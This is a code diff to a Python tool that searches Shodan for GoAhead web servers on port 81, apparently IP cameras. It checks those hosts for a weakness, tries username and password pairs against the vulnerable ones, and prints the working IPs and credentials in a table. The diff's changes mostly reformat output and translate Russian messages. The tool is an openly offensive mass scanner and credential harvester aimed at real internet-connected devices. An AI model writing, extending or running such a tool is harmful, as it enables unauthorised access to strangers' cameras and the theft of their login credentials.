@@ -5,8 +5,9 @@ from colorama import init, Fore, Back
 from progress.bar import IncrementalBar
 
 from collections import Counter
+from prettytable import PrettyTable
 
-os.system('cls || clear')
+os.system('cls')
 
 try:
  mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
@@ -21,7 +22,7 @@ except:
 #   pass
 # else:
 #   print("This user is not registered.\n")
-#   input("Press Enter to exit.")
+#   inputi"Press Enter to exit.")
 #   exit()
 
 init(autoreset=True)
@@ -44,7 +45,7 @@ api = shodan.Shodan(key)
 
 num_of_vulnerable = []
 locations = []
-ips = []
+ips = []#'220.126.32.138']
 
 def st():
 
@@ -52,7 +53,7 @@ def st():
   results = api.search('realm="GoAhead", domain=":81"')
  except shodan.exception.APIError:
   #os.remove(r'C:\Windows\Temp\te.config')
-  input('Неправильный ключ API!\nПерезапустите программу и введите корректный API.')
+  input('Wrong API key!\nRestart the program and enter the correct API.')
   exit()
 
  #ips.clear()
@@ -62,11 +63,6 @@ def st():
   #   e.write(format(result['ip_str'])+'\n')
   ka = result['location']
   locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")
- # print('Do:', len(ips))
- # #list(set(ips))
- # print('Posle: ', len(list(set(ips))))
- # print(f"Одинаковые: {Counter(ips)}")
- # print(f"Одинаковые: {Counter(list(set(ips)))}")
 
  for ip in list(set(ips)):
   try:
@@ -96,7 +92,19 @@ if len(num_of_vulnerable) >= int('1'):
 else:
   taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
 
-print(f'Devices checked: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
+print(f'Devices tested: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
+
+
+
+
+
+th = ['IP', 'USERNAME', 'PASSWORD']
+td = []
+
+
+
+
+
 
 if len(num_of_vulnerable) >= int('1'):
  s = session()
@@ -107,7 +115,7 @@ if len(num_of_vulnerable) >= int('1'):
   #username = None
   #password = None
   #print(f'Username: {username}, password: {password}')
-  asq = []
+  #asq = []
 
   for ipi in num_of_vulnerable:
    try:
@@ -129,7 +137,11 @@ if len(num_of_vulnerable) >= int('1'):
       #password = words[i+1]
       if page.status_code == 200:
        #print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
-       asq.append(f'IP: {ipi}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
+       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
+       td.append(ipi)
+       td.append(words[i])
+       td.append(words[i+1])
+       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
        raz += 1
        #print(asq)
        bar.next()
@@ -141,11 +153,26 @@ if len(num_of_vulnerable) >= int('1'):
       continue
    except:
     continue
- print('\n------------\n')
+ print('')
 
- for d in asq:
-  print(d)
- input("\nClick Enter to exit.")
-else:
- input("No vulnerable devices was found!\nClick Enter to exit.")
+# for d in asq:
+#  print(d)
+#  input("\nClick Enter to exit.")
+# else:
+#  input("No vulnerable devices was found!\nClick Enter to exit.")
 #input()
+
+if len(num_of_vulnerable) >= int('1'):
+ columns = len(th)
+
+ table = PrettyTable(th)
+
+ td_data = td[:]
+ while td_data:
+    table.add_row(td_data[:columns])
+    td_data = td_data[columns:]
+ print(table)
+else:
+ print("No vulnerable devices was found!")
+
+input('\n')
